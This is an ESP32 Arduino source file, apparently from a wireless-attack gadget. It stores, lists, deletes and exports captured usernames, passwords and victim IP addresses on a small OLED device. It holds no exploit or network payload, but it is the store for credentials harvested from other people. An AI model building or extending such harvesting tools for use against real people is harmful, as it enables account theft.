#include "credentials.h"
#include "config.h"
#include "utils.h"
#include "icons.h"
#include "menu.h"
#include "pins.h"
#include <U8g2lib.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

CapturedCredential capturedCreds[MAX_CREDENTIALS];
int credCount = 0;
int credViewIndex = 0;
int credMenuState = 0;

void loadCredentials() {
  if(!SPIFFS.begin(true)) { 
    Serial.println("❌ SPIFFS mount failed");
    return; 
  }
  
  if(!SPIFFS.exists(CREDENTIALS_FILE)) { 
    credCount = 0; 
    saveCredentials(); 
    Serial.println("📄 Created new credentials file");
    return; 
  }
  
  File file = SPIFFS.open(CREDENTIALS_FILE, "r");
  if(!file) {
    Serial.println("❌ Failed to open credentials file");
    return;
  }
  
  StaticJsonDocument<16384> doc;
  DeserializationError error = deserializeJson(doc, file);
  file.close();
  
  if(error) {
    Serial.println("❌ Failed to parse credentials JSON");
    return;
  }
  
  credCount = doc["count"] | 0;
  if(credCount > MAX_CREDENTIALS) credCount = MAX_CREDENTIALS;
  
  for(int i = 0; i < credCount; i++) {
    capturedCreds[i].username = doc["creds"][i]["username"] | "";
    capturedCreds[i].password = doc["creds"][i]["password"] | "";
    capturedCreds[i].ip = doc["creds"][i]["ip"] | "";
    capturedCreds[i].type = doc["creds"][i]["type"] | "";
    capturedCreds[i].timestamp = doc["creds"][i]["timestamp"] | "";
  }
  
  Serial.printf("📂 Loaded %d credentials\n", credCount);
}

void saveCredentials() {
  StaticJsonDocument<16384> doc;
  doc["count"] = credCount;
  JsonArray creds = doc.createNestedArray("creds");
  
  for(int i = 0; i < credCount; i++) {
    JsonObject obj = creds.createNestedObject();
    obj["username"] = capturedCreds[i].username;
    obj["password"] = capturedCreds[i].password;
    obj["ip"] = capturedCreds[i].ip;
    obj["type"] = capturedCreds[i].type;
    obj["timestamp"] = capturedCreds[i].timestamp;
  }
  
  File file = SPIFFS.open(CREDENTIALS_FILE, "w");
  if(!file) {
    Serial.println("❌ Failed to save credentials");
    return;
  }
  
  serializeJson(doc, file);
  file.close();
  Serial.printf("💾 Saved %d credentials\n", credCount);
}

void addCredential(String username, String password, String ip, String type) {
  Serial.printf("📝 Adding credential: %s / %s\n", username.c_str(), password.c_str());
  
  for(int i = 0; i < credCount; i++) {
    if(capturedCreds[i].username == username && capturedCreds[i].password == password) {
      Serial.println("⏭️ Duplicate credential - skipping");
      return;
    }
  }
  
  if(credCount >= MAX_CREDENTIALS) {
    for(int i = 0; i < MAX_CREDENTIALS - 1; i++) {
      capturedCreds[i] = capturedCreds[i + 1];
    }
    credCount = MAX_CREDENTIALS - 1;
  }
  
  capturedCreds[credCount].username = username;
  capturedCreds[credCount].password = password;
  capturedCreds[credCount].ip = ip;
  capturedCreds[credCount].type = type;
  capturedCreds[credCount].timestamp = getTimestampStr();
  credCount++;
  saveCredentials();
  Serial.printf("✅ Credential saved! Total: %d\n", credCount);
  
  showPopupMessage("✅ Credential Saved!", username.c_str(), password.c_str());
  delay(800);
}

void clearCredentials() {
  credCount = 0;
  saveCredentials();
  showPopupMessage("🗑️ Credentials Cleared", "All data removed");
  delay(1000);
}

void exportCredentials() {
  if(credCount == 0) {
    showPopupMessage("📭 No Credentials", "Nothing to export");
    delay(1000);
    return;
  }
  Serial.println("📤 Exporting credentials:");
  Serial.println("Username,Password,Type,IP,Timestamp");
  for(int i = 0; i < credCount; i++) {
    Serial.printf("%s,%s,%s,%s,%s\n",
                 capturedCreds[i].username.c_str(),
                 capturedCreds[i].password.c_str(),
                 capturedCreds[i].type.c_str(),
                 capturedCreds[i].ip.c_str(),
                 capturedCreds[i].timestamp.c_str());
  }
  showPopupMessage("📤 Exported!", String(credCount).c_str(), "to Serial Monitor");
  delay(1000);
}

void credentialsSetup() {
  loadCredentials();
  credViewIndex = 0;
  credMenuState = 0;
  clearPopup();
  showPopupMessage("🔑 Credentials", String(credCount).c_str(), "SELECT to view");
  delay(1500);
  
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawXBMP(56, 5, 16, 16, icon_creds);
  CenteredStr(25, "Saved Credentials");
  char countStr[32];
  sprintf(countStr, "Total: %d", credCount);
  CenteredStr(40, countStr);
  CenteredStr(55, "SELECT to view");
  u8g2.sendBuffer();
}

void credentialsLoop() {
  if (drawPopupIfActive()) {
    delay(50);
    return;
  }
  
  if(isButtonPressed(BTN_BACK)) { 
    exitModule(); 
    return; 
  }
  
  if(credMenuState == 0) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawXBMP(56, 5, 16, 16, icon_creds);
    CenteredStr(20, "Saved Credentials");
    char countStr[32];
    sprintf(countStr, "Total: %d", credCount);
    CenteredStr(35, countStr);
    CenteredStr(48, "SELECT to view");
    CenteredStr(58, "BACK to exit");
    u8g2.sendBuffer();
    
    if(isButtonPressed(BTN_SELECT)) {
      if(credCount > 0) { 
        credMenuState = 1; 
        credViewIndex = 0; 
      } else {
        showPopupMessage("No credentials!", "", "");
        delay(1000);
      }
    }
    return;
  }
  
  // ✅ Use drawScrollingMenu for credential list - 4 visible items
  if(credMenuState == 1) {
    String* displayItems = new String[credCount];
    for(int i = 0; i < credCount; i++) {
      char item[30];
      String typeShort = capturedCreds[i].type.substring(0, 4);
      sprintf(item, "%s %s", capturedCreds[i].username.substring(0, 10).c_str(), typeShort.c_str());
      displayItems[i] = String(item);
    }
    const char** items = new const char*[credCount];
    for(int i = 0; i < credCount; i++) items[i] = displayItems[i].c_str();
    
    // ✅ Use drawScrollingMenu with 4 visible items
    drawScrollingMenu(items, credCount, credViewIndex, 4, "Credentials", 7);
    
    if(isButtonPressed(BTN_UP)) credViewIndex = (credViewIndex - 1 + credCount) % credCount;
    if(isButtonPressed(BTN_DOWN)) credViewIndex = (credViewIndex + 1) % credCount;
    if(isButtonPressed(BTN_SELECT)) credMenuState = 2;
    if(isButtonPressed(BTN_BACK)) credMenuState = 0;
    
    delete[] displayItems;
    delete[] items;
    return;
  }
  
  if(credMenuState == 2) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawXBMP(56, 0, 16, 16, icon_creds);
    u8g2.drawLine(0, 12, 128, 12);
    u8g2.setCursor(0, 22);
    u8g2.print("User: "); u8g2.print(capturedCreds[credViewIndex].username.c_str());
    u8g2.setCursor(0, 32);
    u8g2.print("Pass: "); u8g2.print(capturedCreds[credViewIndex].password.c_str());
    u8g2.setCursor(0, 42);
    u8g2.print("Type: "); u8g2.print(capturedCreds[credViewIndex].type.c_str());
    u8g2.setCursor(0, 52);
    u8g2.print("IP: "); u8g2.print(capturedCreds[credViewIndex].ip.c_str());
    u8g2.sendBuffer();
    
    if(isButtonPressed(BTN_BACK)) credMenuState = 1;
    
    if(isButtonPressed(BTN_SELECT)) {
      u8g2.clearBuffer();
      CenteredStr(30, "Delete?");
      CenteredStr(45, "UP: Yes  DOWN: No");
      u8g2.sendBuffer();
      bool waiting = true;
      while(waiting) {
        if(isButtonPressed(BTN_UP)) {
          for(int i = credViewIndex; i < credCount - 1; i++) {
            capturedCreds[i] = capturedCreds[i + 1];
          }
          credCount--;
          saveCredentials();
          if(credCount == 0) credMenuState = 0;
          else credViewIndex = min(credViewIndex, credCount - 1);
          showPopupMessage("🗑️ Deleted!", "", "");
          delay(800);
          waiting = false;
        }
        if(isButtonPressed(BTN_DOWN)) waiting = false;
        if(isButtonPressed(BTN_BACK)) waiting = false;
        delay(20);
      }
    }
  }
  delay(20);
}